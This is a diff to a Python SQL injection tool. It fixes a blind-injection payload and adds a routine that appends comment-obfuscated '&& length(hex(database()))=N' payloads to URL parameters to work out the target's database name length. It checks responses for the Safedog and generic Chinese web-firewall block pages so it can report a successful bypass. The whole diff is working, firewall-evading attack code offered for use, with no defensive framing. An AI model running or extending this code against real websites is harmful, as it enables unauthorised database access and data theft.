@@ -251,7 +251,7 @@ class Payload2(object):
     payloads2 = "/**//*!order*//**/by/**/{}"
 
     payloads3 = "%20%26%26%20(length(database/**/())={})"
-    payloads4 = "%20%26%26%20(length(hex(database/**/()))={}"
+    payloads4 = "%20%26%26%20(length(hex(database/**/()))={})"
     payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={}"
 
     payloads6 = "%20%26%26%20(1=(select%20count(/*!{}*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"
@@ -280,7 +280,7 @@ class RePLace(Payload1,
               Find_attribute,
               Journal,
               Test):
-    '''针对4.0 payload替换.'''
+    '''New payloads.'''
 
     def __init__(self,url,name):
         # print(self.b)
@@ -496,21 +496,61 @@ class RePLace(Payload1,
                 # print('Error2 -> ',traceback.format_exc())
                 return False
 
-    # def payload2_(self):
-    #     """
-    #     2.判断数据库长度(GET)
-    #     """
-    #     l = 0
-    #     while True:
-    #         p = self.payloads4.format(str(l))
-    #         url = self.url+p
-    #         r = self.req_(url)
-    #         if "网站防火墙" not in r and "安全狗" not in r:
-    #             return r
-    #         else:
-    #             return False
-            
-    #         l += 1
+    def Judging_database_length2(self,url):
+        """
+        2.判断数据库长度(GET)
+        """
+        try:
+            u1 = self.nurl_(url)
+            url1 = u1[0]
+            pars1 = u1[1]
+            value1 = u1[2]
+            payloads = self.payloads4
+            i = 0
+            while True:
+                urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
+                if urls:
+                    print('[*]payloads7 -> '+urls)
+                r = self.req_(urls)
+                if '安全狗' not in r and '网站防火墙' not in r:
+                    if r:
+                        #判断如果长度为0且返回正常页面则payload失效.
+                        if i == 0:
+                            if r:
+                                return False
+                        return r
+                i += 1
+            return False
+        except Exception as e:
+            # print('Error1 -> ',traceback.format_exc())
+            try:
+                u1 = self.nurl__(url)
+                url = u1[0]
+                pars = u1[1]
+                value = u1[2]
+                payloads = self.payloads4
+                i = 0
+                while True:    
+                    for url1,pars1,value1 in zip(url,pars,value):
+                        urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
+                        if urls:
+                            print('[*]payloads8 -> '+urls)
+                        r = self.req_(urls)
+                        if '安全狗' not in r and '网站防火墙' not in r:
+                            if r:
+                                #判断如果长度为0且返回正常页面则payload失效.
+                                if i == 0:
+                                    if r:
+                                        return False
+                                return r
+                    i += 1
+                return False    
+            except Exception as e:
+                # print('Error2 -> ',traceback.format_exc())
+                return False
+
+
+
 
     # def payload2__(self):
     #     """
@@ -766,10 +806,16 @@ def run():
                     print('[+]过滤绕过成功 | payloads -> '+url)
                     a = s.Judging_database_length1(url)
                     if not a:
-                        print('[-]获取数据库长度失败 | payloads -> '+url)
+                        print('[-]获取数据库长度失败 | payloads1 -> '+url)
+                        a = s.Judging_database_length2(url)
+                        if not a:
+                            print('[-]获取数据库长度失败 | payloads2 -> '+url)
+                        else:
+                            print('[+]获取数据库长度成功 | payloads2 -> '+url)
+                            print('Result2 -> ',a)
                     else:
                         print('[+]获取数据库长度成功 | payloads -> '+url)
-                        print('Result -> ',a)
+                        print('Result1 -> ',a)
 
                     
 
